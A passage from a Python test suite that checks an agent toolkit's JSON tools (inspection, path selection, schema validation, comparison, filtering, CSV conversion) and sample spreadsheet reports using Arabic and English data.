        info, status = invoke(agents, ex, "json_inspect", {"file_ref": ref})
        assert status == "success", info
        assert info["kind"] == "jsonl" and info["valid"] is False and info["error_line"] == 3
        assert "Line 3" in info["problem"] and "2 line(s) before it were fine" in info["problem"]
        good = upload(ex, "events.jsonl", '{"id": 1, "الحالة": "تم"}\n{"id": 2}\n')
        info, _ = invoke(agents, ex, "json_inspect", {"file_ref": good})
        assert info["kind"] == "jsonl" and info["records"] == 2

    def test_nan_and_infinity_are_not_json(self, agents):
        ex, _ = make()
        ref = upload(ex, "nan.json", '{"a": 1,\n "b": NaN}')
        info, _ = invoke(agents, ex, "json_inspect", {"file_ref": ref})
        assert info["valid"] is False and "NaN" in info["problem"] and info["error_line"] == 2

    def test_a_csv_is_told_apart_from_broken_json(self, agents):
        ex, _ = make()
        ref = upload(ex, "list.csv", "id,total\nA-1,10\nA-2,20\n")
        info, _ = invoke(agents, ex, "json_inspect", {"file_ref": ref})
        assert info["kind"] == "csv" and "json_from_table" in info["problem"]

    def test_a_path_reaches_every_item(self, agents, orders):
        ex, _, ref = orders
        result, status = invoke(agents, ex, "json_select", {"file_ref": ref, "path": "orders[*].customer.name"})
        assert status == "success", result
        assert [r["value"] for r in result["results"]] == ["مؤسسة الميناء", "Cedar Office", "Northlight"]
        assert result["results"][0]["path"] == "orders[0].customer.name"
        bad, status = invoke(agents, ex, "json_select", {"file_ref": ref, "path": "orders[oops]"})
        assert status == "error" and "not an index" in bad["error"]

    def test_each_record_is_checked_with_formats(self, agents, orders):
        ex, provider, ref = orders
        result, status = invoke(agents, ex, "json_validate", {"file_ref": ref, "schema": ORDER_SCHEMA,
                                                              "record_path": "orders"})
        assert status == "success", result
        assert result["valid"] is False and result["checked"] == 3 and result["failures"] == 2
        found = {(e["record"], e["path"], e["rule"]) for e in result["errors"]}
        assert (1, "customer.email", "format") in found and (1, "placed", "format") in found
        assert (2, "$", "required") in found
        assert job(provider, result)["kind"] == "validate"

    def test_a_schema_can_be_a_file_and_a_broken_one_is_its_own_fault(self, agents, orders):
        ex, _, ref = orders
        schema_ref = upload(ex, "schema.json", {"type": "object", "required": ["generated"]})
        result, _ = invoke(agents, ex, "json_validate", {"file_ref": ref, "schema_ref": schema_ref})
        assert result["valid"] is False and "generated" in result["errors"][0]["message"]
        broken, status = invoke(agents, ex, "json_validate", {"file_ref": ref, "schema": {"type": "nonsense"}})
        assert status == "error" and "schema itself" in broken["error"]
        none, status = invoke(agents, ex, "json_validate", {"file_ref": ref})
        assert status == "error" and "No schema" in none["error"]

    def test_compare_holds_one_and_true_apart(self, agents):
        ex, _ = make()
        a = upload(ex, "v1.json", {"paid": 1, "count": 1, "code": 1, "price": 1, "اسم": "أ"})
        b = upload(ex, "v2.json", {"paid": True, "count": 1.0, "code": "1", "price": 1, "اسم": "ب"})
        result, status = invoke(agents, ex, "json_compare", {"file_ref_a": a, "file_ref_b": b})
        assert status == "success", result
        by_path = {c["path"]: c for c in result["changes"]}
        assert set(by_path) == {"paid", "code", "اسم"} and result["changed"] == 3
        assert by_path["paid"]["type_changed"] == "number → boolean"
        assert by_path["code"]["before"] == "1" and by_path["code"]["after"] == '"1"'

    def test_records_are_filtered_by_conditions_exactly(self, agents, orders):
        ex, provider, ref = orders
        result, status = invoke(agents, ex, "json_filter", {
            "file_ref": ref, "record_path": "orders", "filename": "مدفوعة",
            "conditions": [{"path": "paid", "op": "eq", "value": True}]})
        assert status == "success", result
        kept = json.loads(produced_text(ex, result))
        assert [r["id"] for r in kept] == ["A-1001"]                  # paid: 1 is not true
        assert result["filename"] == "مدفوعة.json" and result["records_read"] == 3
        big, _ = invoke(agents, ex, "json_filter", {
            "file_ref": ref, "record_path": "orders", "filename": "big",
            "conditions": [{"path": "total", "op": "gt", "value": 2000}, {"path": "customer.city", "op": "exists"}]})
        assert [r["id"] for r in json.loads(produced_text(ex, big))] == ["A-1001"]

    def test_json_becomes_a_csv_with_a_byte_order_mark_and_dotted_columns(self, agents, orders):
        ex, _, ref = orders
        result, status = invoke(agents, ex, "json_to_table", {
            "file_ref": ref, "filename": "orders", "record_path": "orders[*]",
            "columns": ["id", "customer.name", "customer.city", "total"]})
        assert status == "success", result
        raw = produced_text(ex, result)
        assert raw.startswith(codecs.BOM_UTF8)
        rows = list(csv.reader(io.StringIO(raw.decode("utf-8-sig"))))
        assert rows[0] == ["id", "customer.name", "customer.city", "total"]
        assert rows[1] == ["A-1001", "مؤسسة الميناء", "مسقط", "3700.0"]
        assert rows[3] == ["A-1003", "Northlight", "صلالة", ""]          # no total: an empty cell, not a guess

    def test_a_table_becomes_json_with_identifiers_and_currencies_kept_as_text(self, agents):
        ex, _ = make()
        ref = upload(ex, "in.csv", "id;phone;qty;price;fee;ok;note;customer.city\n"
                                   "007;+971501234567;20;12,50;AED 5,00;true;NaN;دبي\n"
                                   "008;+971509999999;3;1.234,56;AED 1,00;false;;الشارقة\n")
        result, status = invoke(agents, ex, "json_from_table", {"file_ref": ref, "filename": "out"})
        assert status == "success", result
        records = json.loads(produced_text(ex, result))
        first = records[0]
        assert first["id"] == "007" and first["phone"] == "+971501234567"
        assert first["qty"] == 20 and first["price"] == 12.5 and records[1]["price"] == 1234.56
        assert first["fee"] == "AED 5,00" and first["ok"] is True and first["note"] == "NaN"
        assert first["customer"] == {"city": "دبي"}
        assert "NaN" not in produced_text(ex, result).decode().replace('"NaN"', "")

    def test_a_table_round_trips_back_into_nested_json(self, agents, orders):
        ex, _, ref = orders
        table, _ = invoke(agents, ex, "json_to_table", {"file_ref": ref, "filename": "orders",
                                                        "record_path": "orders[*]",
                                                        "columns": ["id", "customer.name", "customer.city"]})
        back = upload(ex, "orders.csv", produced_text(ex, table))
        result, status = invoke(agents, ex, "json_from_table", {"file_ref": back, "filename": "again"})
        assert status == "success", result
        records = json.loads(produced_text(ex, result))
        assert records[0]["customer"] == {"name": "مؤسسة الميناء", "city": "مسقط"}


class TestTheSamples:
    """The files the example prompts name, used as the prompts use them."""

    def sample(self, ex, name):
        return upload(ex, name, (ROOT / "sheets" / "samples" / name).read_bytes())

    def test_the_arabic_branch_report_pivots(self, agents):
        ex, _ = make()
        ref = self.sample(ex, "branch-sales-ar.csv")
        result, status = invoke(agents, ex, "calc_pivot", {"file_ref": ref, "rows": ["الفرع"], "across": "الشهر",
                                                           "values": "المبيعات (د.إ)"})
        assert status == "success", result
        assert result["grand_total"] == "82157.40"

    def test_the_order_export_fails_its_schema_where_the_prompts_say(self, agents):
        ex, _ = make()
        orders, schema = self.sample(ex, "orders-export.json"), self.sample(ex, "order-schema.json")
        result, status = invoke(agents, ex, "json_validate", {"file_ref": orders, "schema_ref": schema,
                                                              "record_path": "orders"})
        assert status == "success", result
        assert result["checked"] == 4 and result["failures"] >= 1

    def test_the_price_list_reconciles_with_the_catalog(self, agents):
        ex, _ = make()
        prices, catalog = self.sample(ex, "supplier-price-list.csv"), self.sample(ex, "product-catalog.csv")
        result, status = invoke(agents, ex, "reconcile_match", {
            "file_ref_a": prices, "file_ref_b": catalog, "filename": "r", "keys": [{"a": "sku", "b": "sku"}]})
        assert status == "success", result
        assert result["matched"] == 9 and result["only_in_a"] == 2 and result["only_in_b"] == 1
